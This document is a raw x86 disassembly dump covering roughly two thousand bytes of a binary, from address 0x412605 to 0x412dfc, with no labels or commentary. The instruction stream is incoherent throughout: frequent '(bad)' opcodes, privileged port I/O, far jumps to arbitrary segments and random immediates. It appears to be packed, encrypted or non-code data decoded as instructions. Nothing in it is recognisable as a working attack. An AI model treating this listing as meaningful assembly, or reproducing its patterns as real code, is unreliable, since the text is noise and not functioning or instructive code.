  412605:	cmp    ch,BYTE PTR [esi]
  412607:	ret    0xc661
  41260a:	cmp    edx,DWORD PTR [edx-0x29]
  41260d:	ja     0x412651
  41260f:	cmp    DWORD PTR [ebx-0x51],ebx
  412612:	and    cl,cl
  412614:	mov    al,ds:0x7220b641
  412619:	call   0xf4374f25
  41261e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41261f:	imul   esi,ecx,0xd019ff37
  412625:	ret    0x12db
  412628:	sub    dl,BYTE PTR [esi+eax*8]
  41262b:	mov    WORD PTR [edx-0x13],?
  41262e:	cmp    DWORD PTR [ebx+0x9bb1f34],edx
  412634:	mov    edx,0x7151646c
  412639:	jo     0x412633
  41263b:	pop    ecx
  41263c:	sbb    DWORD PTR [ebx-0x6f818731],edx
  412642:	sbb    eax,0x90e70411
  412647:	je     0x4126c7
  412649:	mov    eax,0x765e9e2
  41264e:	xor    DWORD PTR [edx-0x75],esi
  412651:	(bad)  
  412652:	sbb    BYTE PTR [edi-0x58],dl
  412655:	lock das 
  412657:	leave  
  412658:	stos   DWORD PTR es:[edi],eax
  412659:	nop
  41265a:	mov    ch,0x8f
  41265c:	mov    bh,0xd3
  41265e:	sub    eax,0x19b8f09
  412663:	pop    ebp
  412664:	(bad)
  412667:	mov    ds:0xb167c841,eax
  41266c:	and    DWORD PTR [edx-0xec88ad8],edx
  412672:	dec    ebp
  412673:	icebp  
  412674:	call   0x887e400b
  412679:	test   DWORD PTR [edx+0x4b],esi
  41267c:	mov    dl,BYTE PTR [esi]
  41267e:	push   eax
  41267f:	ret    
  412680:	jp     0x412670
  412682:	mov    ch,0xf7
  412684:	add    DWORD PTR ds:0xfa8dcdaf,ebx
  41268a:	cmp    BYTE PTR [eax+ecx*1],dl
  41268d:	xor    eax,0x9fb7f72e
  412692:	aad    0x5
  412694:	(bad)  
  412695:	int3   
  412696:	pop    ecx
  412697:	cmp    dl,bl
  412699:	sub    ah,BYTE PTR gs:[eax]
  41269c:	or     eax,0x19fe5859
  4126a1:	add    eax,DWORD PTR [ecx+edx*2-0x2ae8d447]
  4126a8:	adc    BYTE PTR [edi],bl
  4126aa:	push   cs
  4126ab:	sub    ecx,edi
  4126ad:	jns    0x4126ae
  4126af:	cli    
  4126b0:	in     al,dx
  4126b1:	ret    0xc578
  4126b4:	pop    ebp
  4126b5:	sub    BYTE PTR [edx+0x2da5bdf4],ch
  4126bb:	es jmp 0x412739
  4126be:	jecxz  0x412678
  4126c0:	je     0x412654
  4126c2:	jno    0x4126ed
  4126c4:	ret    0xa1b
  4126c7:	lea    ecx,[eax+ecx*4]
  4126ca:	xchg   ebx,eax
  4126cb:	jp     0x412655
  4126cd:	push   esp
  4126ce:	cmp    edi,DWORD PTR [esi-0x10da0a05]
  4126d4:	(bad)  
  4126d5:	cmp    al,0xc1
  4126d7:	test   bh,0x27
  4126da:	retf   
  4126db:	test   DWORD PTR [edi],edi
  4126dd:	js     0x412671
  4126df:	or     bl,BYTE PTR [ecx+0x1985997a]
  4126e5:	arpl   WORD PTR [edi+0x50],sp
  4126e8:	loopne 0x41269e
  4126ea:	aam    0x39
  4126ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126ed:	jp     0x412685
  4126ef:	retf   0x7be6
  4126f2:	in     al,dx
  4126f3:	inc    ebp
  4126f4:	into   
  4126f5:	pop    ds
  4126f6:	pcmpgtw mm4,mm7
  4126f9:	sahf   
  4126fa:	shl    edi,cl
  4126fc:	in     eax,0x56
  4126fe:	dec    esp
  4126ff:	shl    BYTE PTR [eax+0x7d556983],cl
  412705:	call   0x3c7a:0xd21228a4
  41270c:	jg     0x4126b7
  41270e:	adc    ah,ch
  412710:	push   ebx
  412711:	out    dx,al
  412712:	inc    esi
  412713:	sbb    eax,DWORD PTR [esi+0x5baf1482]
  412719:	xor    ecx,DWORD PTR [esi+0x51a6eeb7]
  41271f:	loop   0x41275d
  412721:	or     BYTE PTR [ebp-0x1ff7dccf],al
  412727:	ror    DWORD PTR [ebp+0x2d3e15bd],1
  41272d:	ins    DWORD PTR es:[edi],dx
  41272e:	gs inc ecx
  412730:	cdq    
  412731:	dec    eax
  412732:	jg     0x4127ac
  412734:	push   ebx
  412735:	test   dh,bl
  412737:	icebp  
  412738:	ja     0x412736
  41273a:	fwait
  41273b:	shl    BYTE PTR [ecx+0x27],cl
  41273e:	sub    DWORD PTR [edi+0x54],0xffffffa0
  412742:	pop    ecx
  412743:	adc    eax,DWORD PTR [ebx+0x16]
  412746:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412747:	cmp    BYTE PTR ss:[ebx],al
  41274a:	adc    esi,DWORD PTR [edx]
  41274c:	arpl   WORD PTR [eax],di
  41274e:	lock pop esi
  412750:	(bad)
  412753:	out    0xdf,eax
  412755:	pusha  
  412756:	retf   0x176
  412759:	retf   0x4feb
  41275c:	(bad)  
  41275e:	popf   
  41275f:	leave  
  412760:	sahf   
  412761:	test   al,0xe6
  412763:	in     eax,0xdb
  412765:	mov    BYTE PTR [ecx+ecx*2-0x7b],ch
  412769:	sbb    ah,bl
  41276b:	(bad)  
  41276c:	in     eax,0x9c
  41276e:	xor    BYTE PTR [eax],0x53
  412771:	in     eax,dx
  412772:	and    ecx,DWORD PTR [ebp-0x3a]
  412775:	ret    0x1484
  412778:	sub    DWORD PTR [ecx+0x2c454449],edx
  41277e:	add    ecx,DWORD PTR [ebx]
  412780:	add    BYTE PTR [ebp+0x56],bl
  412783:	push   cs
  412784:	dec    edx
  412785:	int3   
  412786:	pop    ecx
  412787:	ffree  st(3)
  412789:	jmp    0x412766
  41278b:	sub    al,0xa
  41278d:	mov    esi,ecx
  41278f:	(bad)  
  412790:	pop    ebx
  412791:	jg     0x4127d3
  412793:	sbb    bh,bl
  412795:	retf   0x5b90
  412798:	adc    eax,0x928e670b
  41279d:	(bad)  
  41279e:	fcom   DWORD PTR [edi]
  4127a0:	and    dl,dl
  4127a2:	mov    ebx,DWORD PTR [esi+ecx*1+0x2b]
  4127a6:	daa    
  4127a7:	pusha  
  4127a8:	push   edx
  4127a9:	ds dec esp
  4127ab:	push   ss
  4127ac:	xchg   DWORD PTR [ebx+0x6f],eax
  4127af:	stc    
  4127b0:	(bad)  
  4127b2:	aam    0xc1
  4127b4:	pop    ds
  4127b5:	pusha  
  4127b6:	mov    bl,0x94
  4127b8:	xor    DWORD PTR [ebx+0x69472933],ecx
  4127be:	outs   dx,BYTE PTR ds:[esi]
  4127bf:	sub    BYTE PTR [edi-0x1e],ch
  4127c2:	mov    eax,0x7a14624b
  4127c7:	(bad)  
  4127c8:	jmp    0x86db:0x8766be54
  4127cf:	jge    0x41280b
  4127d1:	fst    QWORD PTR [edx+0x251ab15c]
  4127d7:	aas    
  4127d8:	mov    esp,0xe430ba48
  4127dd:	(bad)  
  4127e0:	sbb    eax,0x95d9bb29
  4127e5:	and    DWORD PTR [ecx-0x56b36e64],0x2534caf3
  4127ef:	hlt    
  4127f0:	adc    eax,0xc6aa4d89
  4127f5:	not    DWORD PTR [esi-0x30]
  4127f8:	mov    WORD PTR [eax-0x3a79f45d],?
  4127fe:	xor    DWORD PTR [edi+edi*8-0x665e4592],esp
  412805:	fdivr  QWORD PTR [ecx+0x227c87f1]
  41280b:	dec    ebp
  41280c:	data16 fnstcw WORD PTR fs:[eax+0x4ed210b9]
  412814:	rcr    DWORD PTR [esi+0x4b81fcf1],0x5e
  41281b:	repnz dec DWORD PTR ds:0xa4f0d7a1
  412822:	cld    
  412823:	push   ds
  412824:	push   0xbdf5044b
  412829:	add    cl,BYTE PTR [ebx]
  41282b:	jmp    0x41289f
  41282d:	xchg   esi,eax
  41282e:	ret    
  41282f:	xor    DWORD PTR [ecx],0xffffffac
  412832:	adc    cl,BYTE PTR [ebx]
  412834:	lods   al,BYTE PTR ds:[esi]
  412835:	push   edi
  412836:	sahf   
  412837:	push   0x15c0b905
  41283c:	pusha  
  41283d:	iret   
  41283e:	push   ebx
  41283f:	es ds out 0xc6,eax
  412843:	cwde   
  412844:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412845:	sbb    bl,BYTE PTR [ebx-0x732d353e]
  41284b:	add    eax,0xb592e5dc
  412850:	pop    ebp
  412851:	adc    ah,ch
  412853:	scas   al,BYTE PTR es:[edi]
  412854:	fucom  st(1)
  412856:	std    
  412857:	xor    dl,BYTE PTR [edx]
  412859:	scas   eax,DWORD PTR es:[edi]
  41285a:	mov    eax,0x7dbdffca
  41285f:	loopne 0x4128bb
  412861:	push   ebp
  412862:	and    eax,0x1f9804d7
  412867:	push   ds
  412868:	dec    edx
  412869:	fldenv [ecx-0x58]
  41286c:	lods   eax,DWORD PTR ds:[esi]
  41286d:	push   0xb
  41286f:	push   0xe8546191
  412874:	pop    es
  412875:	fmul   QWORD PTR [edi]
  412877:	pop    edx
  412878:	pop    edx
  412879:	daa    
  41287a:	jne    0x41283e
  41287c:	cli    
  41287d:	mov    al,ds:0x2921ed10
  412882:	(bad)  
  412883:	retf   0x195a
  412886:	add    eax,0x497ccea3
  41288b:	mov    ebp,0x8a1f06c2
  412890:	sub    al,0xac
  412892:	repz cmp al,0xaa
  412895:	push   es
  412896:	in     eax,dx
  412897:	or     BYTE PTR [ebp+0x2eef557a],0x15
  41289e:	hlt    
  41289f:	imul   eax,DWORD PTR [eax-0x17],0x806ad6ab
  4128a6:	not    DWORD PTR [eax]
  4128a8:	iret   
  4128a9:	test   ch,cl
  4128ab:	mov    ch,0xd6
  4128ad:	mov    esi,0xb4715d8f
  4128b2:	repnz out 0x1d,eax
  4128b5:	adc    bl,BYTE PTR [ebp-0x59]
  4128b8:	jns    0x412848
  4128ba:	fs rol bl,0xd3
  4128be:	lgdtd  [esi-0x504816e6]
  4128c5:	jmp    0xb63d7cc0
  4128ca:	jbe    0x4128db
  4128cc:	shr    DWORD PTR [ecx-0x1a],cl
  4128cf:	(bad)  [ebp+0x5740d2e1]
  4128d5:	imul   ecx,DWORD PTR [edi-0x36c4a46b],0xe61469d8
  4128df:	sbb    al,0x77
  4128e1:	(bad)  
  4128e2:	and    eax,DWORD PTR [ebp-0x6ad64229]
  4128e8:	retf   
  4128e9:	push   cs
  4128ea:	pop    edi
  4128eb:	inc    edi
  4128ec:	mov    dl,0xca
  4128ee:	adc    al,0x1c
  4128f0:	imul   edi,DWORD PTR [ecx+0x7c],0x24d4f056
  4128f7:	aaa    
  4128f8:	xor    ebp,DWORD PTR [ecx+0x59]
  4128fb:	and    eax,0xec3ab06e
  412900:	or     al,0x2
  412902:	lahf   
  412903:	add    ecx,DWORD PTR ds:0x10196412
  412909:	fisub  DWORD PTR [ebp+edi*8+0x2b]
  41290d:	push   edi
  41290e:	fdivr  DWORD PTR [esi-0x505be359]
  412914:	std    
  412915:	push   esi
  412916:	jmp    0x3e67:0x729fbfc5
  41291d:	fistp  WORD PTR [eax]
  41291f:	or     ah,ch
  412921:	test   eax,0x59fdb67e
  412926:	jmp    0x412969
  412928:	dec    edx
  412929:	sub    BYTE PTR ds:0x61e0b41f,bl
  41292f:	outs   dx,DWORD PTR ds:[esi]
  412930:	jmp    0xed19:0x3fc7fb93
  412937:	push   esi
  412938:	dec    edx
  412939:	xor    DWORD PTR [ecx+0x14],ecx
  41293c:	pop    esi
  41293d:	mov    edi,0xc0d0594c
  412942:	popf   
  412943:	stc    
  412944:	jne    0x4128f7
  412946:	or     al,0x7f
  412948:	or     DWORD PTR [esi],0xee75062
  41294e:	cmp    DWORD PTR [esi+0x4e41e8e9],edx
  412954:	ins    DWORD PTR es:[edi],dx
  412955:	mov    BYTE PTR [ebx+ebp*4],bh
  412958:	test   BYTE PTR [ecx],0x9c
  41295b:	scas   al,BYTE PTR es:[edi]
  41295c:	dec    ebx
  41295d:	push   ecx
  41295e:	pop    eax
  41295f:	in     eax,0x56
  412961:	add    bl,al
  412963:	into   
  412964:	clc    
  412965:	xchg   esi,eax
  412966:	sbb    DWORD PTR [ebp-0xbfebe18],ebx
  41296c:	aas    
  41296d:	jmp    0x412984
  41296f:	dec    ecx
  412970:	in     al,0xfa
  412972:	mov    ch,0x6
  412974:	push   esi
  412975:	mov    ebx,0x96e3ec79
  41297a:	(bad)  
  41297b:	test   eax,0xd4979905
  412980:	mov    ebp,0x83fee622
  412985:	ret    
  412986:	pop    ebx
  412987:	int3   
  412988:	sub    ebp,ebp
  41298a:	outs   dx,BYTE PTR ds:[esi]
  41298b:	fidiv  WORD PTR [edi+esi*4]
  41298e:	ja     0x4129a0
  412990:	xchg   edx,eax
  412991:	pop    ebx
  412992:	lock cmp al,0x0
  412995:	or     DWORD PTR [eax-0x24],0x7b
  412999:	stc    
  41299a:	push   ebx
  41299b:	(bad)  
  41299c:	(bad)
  4129a0:	pop    edx
  4129a1:	mov    ds,WORD PTR [ebp+0x31]
  4129a4:	xchg   BYTE PTR [edi+0x29],dl
  4129a7:	arpl   ax,cx
  4129a9:	mov    es,WORD PTR [ebp+0x4b]
  4129ac:	pop    esp
  4129ad:	jae    0x41299a
  4129af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4129b0:	jp     0x41295a
  4129b2:	ja     0x412961
  4129b4:	and    al,0xe9
  4129b6:	dec    eax
  4129b7:	test   al,ah
  4129b9:	inc    eax
  4129ba:	mov    edi,0x8b0af3d7
  4129bf:	and    BYTE PTR [eax],0x9f
  4129c2:	jmp    0x4129e8
  4129c4:	mov    ebp,0x6d5adb05
  4129c9:	inc    esp
  4129ca:	lea    ecx,[edi-0x55]
  4129cd:	jge    0x4129d5
  4129cf:	fs push esi
  4129d1:	fistp  DWORD PTR [edi+0x788cd9ca]
  4129d7:	in     eax,0x2c
  4129d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4129da:	push   eax
  4129db:	scas   eax,DWORD PTR es:[edi]
  4129dc:	jmp    0x412a3c
  4129de:	aaa    
  4129df:	mov    edx,0x88215e24
  4129e4:	xor    eax,0x8d3be31e
  4129e9:	mov    ecx,0xcbc2a57b
  4129ee:	daa    
  4129ef:	out    0xb6,eax
  4129f1:	xlat   BYTE PTR ds:[ebx]
  4129f2:	je     0x412a27
  4129f4:	inc    ebp
  4129f5:	jmp    0x5edd:0xb83e982a
  4129fc:	push   ds
  4129fd:	stc    
  4129fe:	icebp  
  4129ff:	outs   dx,BYTE PTR ds:[esi]
  412a00:	out    dx,eax
  412a01:	jno    0x412a6e
  412a03:	sub    ebp,DWORD PTR [eax+0x554b3718]
  412a09:	outs   dx,DWORD PTR es:[esi]
  412a0b:	jbe    0x412a00
  412a0d:	mov    al,ds:0x22a0b282
  412a12:	mov    BYTE PTR [ebx+esi*2+0x357a44c3],al
  412a19:	cdq    
  412a1a:	mov    al,ds:0x791390e4
  412a1f:	push   ebx
  412a20:	dec    esi
  412a21:	sahf   
  412a22:	in     al,0x49
  412a24:	xchg   ecx,eax
  412a25:	cmp    eax,0x5d7aac26
  412a2a:	pop    esp
  412a2b:	sbb    cl,bl
  412a2d:	test   eax,0xb8eb1641
  412a32:	mov    ch,0x76
  412a34:	adc    BYTE PTR [eax+ebx*4-0x78c5f6a3],al
  412a3b:	lods   eax,DWORD PTR ds:[esi]
  412a3c:	cmp    DWORD PTR [edi+eax*2-0x47],esi
  412a40:	cwde   
  412a41:	sub    esi,DWORD PTR [ebx-0x27]
  412a44:	add    eax,0x943c9588
  412a49:	outs   dx,DWORD PTR ds:[esi]
  412a4a:	gs mov dh,0x69
  412a4d:	mov    al,0x83
  412a4f:	fmul   QWORD PTR [edx+eiz*2]
  412a52:	pop    ebx
  412a53:	jno    0x412a2e
  412a55:	sbb    DWORD PTR [ecx+0x4],eax
  412a58:	iret   
  412a59:	int3   
  412a5a:	mov    bh,0x47
  412a5c:	jo     0x412ab0
  412a5e:	lock dec esp
  412a60:	fidiv  DWORD PTR [ecx-0x6f8f56e1]
  412a66:	xchg   DWORD PTR [edx],edx
  412a68:	fisubr WORD PTR [ecx+eiz*2]
  412a6b:	sub    DWORD PTR [ebx],edx
  412a6d:	fwait
  412a6e:	dec    ebx
  412a6f:	dec    edi
  412a70:	pop    esi
  412a71:	and    DWORD PTR [ebx+ebp*4],eax
  412a74:	arpl   WORD PTR [ebx+edx*8+0x4790f35d],ax
  412a7b:	int    0xc6
  412a7d:	xchg   BYTE PTR [ebp-0x1d],cl
  412a80:	(bad)  
  412a81:	and    eax,0x94ab108e
  412a86:	neg    DWORD PTR [eax-0x1cd4fffd]
  412a8c:	gs xchg ebx,eax
  412a8e:	stos   DWORD PTR es:[edi],eax
  412a8f:	mov    ds:0xa7d17686,eax
  412a94:	daa    
  412a95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a96:	or     eax,0xc27c49fc
  412a9b:	and    ch,BYTE PTR [esi-0x1f]
  412a9e:	and    BYTE PTR [edx+0x30],ch
  412aa1:	pop    esi
  412aa2:	mov    esi,0x77d0eff6
  412aa7:	lahf   
  412aa8:	aas    
  412aa9:	mov    eax,ds:0xeb2e23ff
  412aae:	into   
  412aaf:	(bad)  
  412ab1:	add    ch,al
  412ab3:	ja     0x412a74
  412ab5:	pop    es
  412ab6:	or     esp,DWORD PTR [esi+0x3a]
  412ab9:	push   0x873abdb7
  412abe:	push   ds
  412abf:	dec    ecx
  412ac0:	inc    eax
  412ac1:	jo     0x412a4b
  412ac3:	jmp    0xf2962f4
  412ac8:	(bad)  
  412ac9:	dec    BYTE PTR [edi-0xb32cc2e]
  412acf:	add    DWORD PTR [ecx+ebx*1-0xc18e43a],esp
  412ad6:	and    DWORD PTR [edx+0x65],0x5d
  412ada:	popa   
  412adb:	cs cmc 
  412add:	jg     0x412aa4
  412adf:	aas    
  412ae0:	(bad)  
  412ae1:	fadd   QWORD PTR [eax]
  412ae3:	popa   
  412ae4:	int3   
  412ae5:	dec    edi
  412ae6:	mov    BYTE PTR [ebp-0x2],bh
  412ae9:	dec    ebx
  412aea:	mov    al,ds:0xc1e87a4b
  412aef:	xchg   DWORD PTR [edi+0x5c],edi
  412af2:	fwait
  412af3:	aaa    
  412af4:	popa   
  412af5:	jns    0x412aa2
  412af7:	jp     0x412b30
  412af9:	icebp  
  412afa:	out    dx,al
  412afb:	add    al,0x31
  412afd:	sub    al,0x41
  412aff:	retf   
  412b00:	jnp    0x412b50
  412b02:	jnp    0x412ae9
  412b04:	dec    ebp
  412b05:	fimul  DWORD PTR [ebx-0x37]
  412b08:	dec    ecx
  412b09:	pop    ss
  412b0a:	xor    al,BYTE PTR [esi+eax*8-0x7e]
  412b0e:	test   BYTE PTR [edx],0x6e
  412b11:	clc    
  412b12:	or     BYTE PTR [edi+0x662889e9],bl
  412b18:	lods   eax,DWORD PTR ds:[esi]
  412b19:	dec    edi
  412b1a:	stos   BYTE PTR es:[edi],al
  412b1b:	bound  ecx,QWORD PTR [edi-0x1f]
  412b1e:	mov    DWORD PTR [ebx+edx*1],edx
  412b21:	iret   
  412b22:	sar    BYTE PTR [ecx-0x13d5d7c5],0xcd
  412b29:	(bad)  
  412b2a:	cmp    al,0xb1
  412b2c:	pop    edx
  412b2d:	leave  
  412b2e:	jae    0x412ab1
  412b30:	iret   
  412b31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b32:	push   esi
  412b33:	addr16 mov bh,0xba
  412b36:	sahf   
  412b37:	inc    edx
  412b38:	shl    DWORD PTR [edx+0x4f],0xb1
  412b3c:	pop    eax
  412b3d:	imul   esi,DWORD PTR [esi-0x2d],0x13fdafca
  412b44:	sub    cl,bh
  412b46:	in     eax,0xef
  412b48:	imul   eax,DWORD PTR [ecx+0x0],0x65
  412b4c:	cmp    eax,edi
  412b4e:	mul    BYTE PTR [ecx]
  412b50:	sub    dl,BYTE PTR [edi]
  412b52:	push   esi
  412b53:	int    0x84
  412b55:	mov    BYTE PTR [edi-0x5c],bl
  412b58:	ja     0x412b2e
  412b5a:	pop    eax
  412b5b:	arpl   WORD PTR [ecx+0x12],cx
  412b5e:	sub    DWORD PTR [edi+edx*2],esp
  412b61:	mov    cl,0xa4
  412b63:	push   ss
  412b64:	mov    edi,DWORD PTR [ebx-0x1fb6df7e]
  412b6a:	cmp    eax,0xfa14aa9e
  412b6f:	stc    
  412b70:	jae    0x412b42
  412b72:	sub    eax,0x269ca5a3
  412b77:	je     0x412be8
  412b79:	out    dx,al
  412b7a:	jecxz  0x412b46
  412b7c:	(bad)  
  412b7d:	cmp    eax,0x1b26b089
  412b82:	out    0xc2,eax
  412b84:	inc    BYTE PTR [ebx]
  412b86:	mov    eax,ds:0x4919a2b3
  412b8b:	mov    DWORD PTR [ecx],0x66ff18d8
  412b91:	xchg   edx,eax
  412b92:	push   0x707ab2ad
  412b97:	shl    BYTE PTR [ebp-0x5739aef6],cl
  412b9d:	sub    DWORD PTR [edi-0x2c4cc08b],ebp
  412ba3:	jg     0x412bcd
  412ba5:	imul   ecx,DWORD PTR [edx-0x31],0x3b
  412ba9:	ins    BYTE PTR es:[edi],dx
  412baa:	repz shr bl,cl
  412bad:	push   esi
  412bae:	in     al,0xd7
  412bb0:	adc    ah,BYTE PTR [edx]
  412bb2:	jl     0x412c0c
  412bb4:	je     0x412bfc
  412bb6:	jl     0x412b45
  412bb8:	jno    0x412bcd
  412bba:	jns    0x412b8a
  412bbc:	jns    0x412bc9
  412bbe:	sub    al,BYTE PTR ds:0xd16b9b29
  412bc4:	add    ah,BYTE PTR [edi+0x2c56c0c6]
  412bca:	ret    0x78f
  412bcd:	push   0x78
  412bcf:	ror    BYTE PTR ss:[eax+0x4e790b67],cl
  412bd6:	pop    edx
  412bd7:	int3   
  412bd8:	sub    ebx,DWORD PTR [ecx+0x31c795ea]
  412bde:	xor    ch,BYTE PTR [ebx-0x536b2bcb]
  412be4:	fcomp  QWORD PTR [edx-0x1a]
  412be7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412be8:	add    edx,DWORD PTR [ecx+0x54]
  412beb:	and    BYTE PTR [eax],0xed
  412bee:	add    esp,edx
  412bf0:	lds    esi,FWORD PTR [ecx]
  412bf2:	js     0x412bd1
  412bf4:	sbb    eax,0x1c298fab
  412bf9:	jno    0x412c5f
  412bfb:	cs cmc 
  412bfd:	gs out dx,al
  412bff:	pop    esi
  412c00:	xchg   esi,eax
  412c01:	loop   0x412bc2
  412c03:	in     eax,dx
  412c04:	(bad)  
  412c06:	inc    esi
  412c07:	test   al,0xb3
  412c09:	jle    0x412c2a
  412c0b:	(bad)  
  412c0c:	mov    ah,0x16
  412c0e:	add    eax,0xc1a7b5f
  412c13:	sbb    al,0x97
  412c15:	mov    eax,0x61ff045c
  412c1a:	fdiv   DWORD PTR [ecx+esi*2+0x2f]
  412c1e:	inc    edx
  412c1f:	in     al,0x70
  412c21:	adc    bl,cl
  412c23:	add    al,0xe9
  412c25:	push   es
  412c26:	mov    ch,0xea
  412c28:	fbld   TBYTE PTR [ebx]
  412c2a:	jnp    0x412c96
  412c2c:	dec    eax
  412c2d:	pop    eax
  412c2e:	sti    
  412c2f:	loope  0x412ca7
  412c31:	mov    ebx,0xaf7086c
  412c36:	mov    ecx,0x8c5c60ec
  412c3b:	ret    0xae0c
  412c3e:	dec    ecx
  412c3f:	test   eax,0x2cb1ffad
  412c44:	pop    ecx
  412c45:	adc    eax,DWORD PTR [ebx]
  412c47:	adc    DWORD PTR [eax+0x16ed70bc],esi
  412c4d:	xchg   ecx,eax
  412c4e:	stos   DWORD PTR es:[edi],eax
  412c4f:	sub    DWORD PTR [edx-0x20250585],ebx
  412c55:	int    0x38
  412c57:	sbb    ebp,edi
  412c59:	cmp    DWORD PTR [ecx+0x3ca4a753],esi
  412c5f:	cs test al,0xac
  412c62:	push   es
  412c63:	xchg   edi,eax
  412c64:	inc    edx
  412c65:	inc    edx
  412c66:	retf   
  412c67:	or     eax,DWORD PTR [eax]
  412c69:	pop    esi
  412c6a:	mul    DWORD PTR [ebx+0x2071b684]
  412c70:	fxch   st(4)
  412c72:	cmp    al,0xcf
  412c74:	cmp    edi,eax
  412c76:	inc    BYTE PTR [ebx]
  412c78:	ficomp DWORD PTR [eax-0x715a394e]
  412c7e:	addr16 aaa 
  412c80:	inc    ecx
  412c81:	or     bl,al
  412c83:	jp     0x412cc8
  412c85:	arpl   WORD PTR [esi-0x5968e6e6],si
  412c8b:	adc    BYTE PTR [esi+0x62ea4caa],0xc
  412c92:	outs   dx,BYTE PTR ds:[esi]
  412c93:	stos   BYTE PTR es:[edi],al
  412c94:	(bad)  [eax-0x57]
  412c97:	rcr    BYTE PTR [esp+edi*2+0x23],0xba
  412c9c:	add    dh,BYTE PTR [ebp+0x7734f753]
  412ca2:	daa    
  412ca3:	in     eax,dx
  412ca4:	imul   edi,DWORD PTR cs:[ecx-0x7d93bec0],0xfffffff5
  412cac:	push   cs
  412cad:	push   cs
  412cae:	cmp    dh,BYTE PTR [ecx+0x13]
  412cb1:	xor    ebp,ecx
  412cb3:	mov    bh,BYTE PTR [ebp+0x677a7c6e]
  412cb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412cba:	or     BYTE PTR [ebx-0x677c45c1],ah
  412cc0:	xchg   edi,eax
  412cc1:	sub    DWORD PTR ds:0x9d103791,0xb268036f
  412ccb:	mov    edi,0xdf939720
  412cd0:	(bad)  
  412cd1:	mov    edx,0xf0525d4d
  412cd6:	mov    cl,0xf8
  412cd8:	sub    ebx,ebp
  412cda:	inc    eax
  412cdb:	retf   0xa7bb
  412cde:	sbb    al,0x13
  412ce0:	cmp    ah,BYTE PTR [esi]
  412ce2:	xchg   DWORD PTR [edx+0xf0151a4],ebp
  412ce8:	dec    edx
  412ce9:	mov    ebx,0xd5884596
  412cee:	rcl    DWORD PTR [ecx+0x34b81e77],0x24
  412cf5:	push   edi
  412cf6:	hlt    
  412cf7:	dec    ebx
  412cf8:	(bad)  
  412cf9:	and    al,0x22
  412cfb:	mov    ebp,0x49f27d08
  412d00:	daa    
  412d01:	xchg   edi,eax
  412d02:	shl    DWORD PTR [ecx],0xb3
  412d05:	cld    
  412d06:	lahf   
  412d07:	ret    
  412d08:	fwait
  412d09:	sbb    eax,0x4864cc7e
  412d0e:	xchg   ebx,eax
  412d0f:	cmp    al,0x88
  412d11:	ds mov edi,0x95cb23e1
  412d17:	pushf  
  412d18:	test   DWORD PTR [eax+0x7f9f6061],edi
  412d1e:	xchg   ebx,eax
  412d1f:	push   esi
  412d20:	lods   al,BYTE PTR ds:[esi]
  412d21:	into   
  412d22:	push   esp
  412d23:	jmp    0x412d07
  412d25:	jl     0x412cb2
  412d27:	les    edx,FWORD PTR [ebp+0x23087839]
  412d2d:	sbb    dl,BYTE PTR [edi+esi*4]
  412d30:	or     dl,BYTE PTR [eax-0x6bd46b48]
  412d36:	fnstsw WORD PTR [eax]
  412d38:	xchg   edi,esi
  412d3a:	addr16 dec edi
  412d3c:	mov    DWORD PTR gs:[ebp-0x4641725f],ecx
  412d43:	pop    esi
  412d44:	cvtps2pd xmm0,QWORD PTR [esi+edx*8+0x2daffc6]
  412d4c:	lds    edx,FWORD PTR [eax]
  412d4e:	pop    eax
  412d4f:	shl    DWORD PTR [edi-0x33ab616a],0x4
  412d56:	push   es
  412d57:	test   BYTE PTR [edx],ch
  412d59:	into   
  412d5a:	cld    
  412d5b:	mov    eax,ds:0x7b32a3f7
  412d60:	aad    0x86
  412d62:	jb     0x412d20
  412d64:	mov    dh,0xa
  412d66:	(bad)  
  412d67:	mov    bh,0x1c
  412d69:	sar    ah,0x38
  412d6c:	outs   dx,BYTE PTR ds:[esi]
  412d6d:	pop    edx
  412d6e:	pop    es
  412d6f:	mov    cl,0x6a
  412d71:	hlt    
  412d72:	fcom   DWORD PTR [esi]
  412d74:	loop   0x412d13
  412d76:	inc    edi
  412d77:	clc    
  412d78:	repnz mov BYTE PTR [esp+ebp*8+0x5f877b0d],bh
  412d80:	sbb    DWORD PTR [ebp-0x33f5f474],ebp
  412d86:	clc    
  412d87:	sbb    bl,BYTE PTR [edi+edx*1-0x6e]
  412d8b:	xor    bl,cl
  412d8d:	stc    
  412d8e:	push   ecx
  412d8f:	add    BYTE PTR [eax],al
  412d91:	sub    eax,0x4efe834a
  412d96:	sub    BYTE PTR [eax-0x1],dl
  412d99:	gs (bad) 
  412d9b:	test   eax,0x1b0148c2
  412da0:	arpl   WORD PTR [ecx+0x1d080924],si
  412da6:	scas   al,BYTE PTR es:[edi]
  412da7:	xor    esi,ecx
  412da9:	cmp    al,al
  412dab:	enter  0xeaf8,0x3
  412daf:	add    esi,ecx
  412db1:	jl     0x412dc4
  412db3:	xor    edx,ecx
  412db5:	lahf   
  412db6:	mov    ch,0xe7
  412db8:	add    al,BYTE PTR [edx-0x183a09c1]
  412dbe:	cmp    ebx,DWORD PTR [edx]
  412dc0:	or     edi,eax
  412dc2:	mov    ch,0x1c
  412dc4:	dec    edx
  412dc5:	inc    eax
  412dc6:	retf   
  412dc7:	test   BYTE PTR [edi],ch
  412dc9:	jmp    0x2ad67369
  412dce:	mov    dl,0xd8
  412dd0:	loop   0x412e31
  412dd2:	dec    esp
  412dd3:	test   DWORD PTR [edi-0x28bcd410],edi
  412dd9:	enter  0xe8bb,0x34
  412ddd:	mov    esp,0x10aa322
  412de2:	fidiv  WORD PTR [edx+0x34]
  412de5:	test   eax,0x50de4da4
  412dea:	xor    al,0x70
  412dec:	jge    0x412e3b
  412dee:	fmul   QWORD PTR ds:0xf0513dcd
  412df4:	inc    esp
  412df5:	fwait
  412df6:	add    DWORD PTR [ebx-0x2c],eax
  412df9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412dfa:	adc    ebx,DWORD PTR [ecx]
  412dfc:	mov    WORD PTR [ecx+0x55],gs
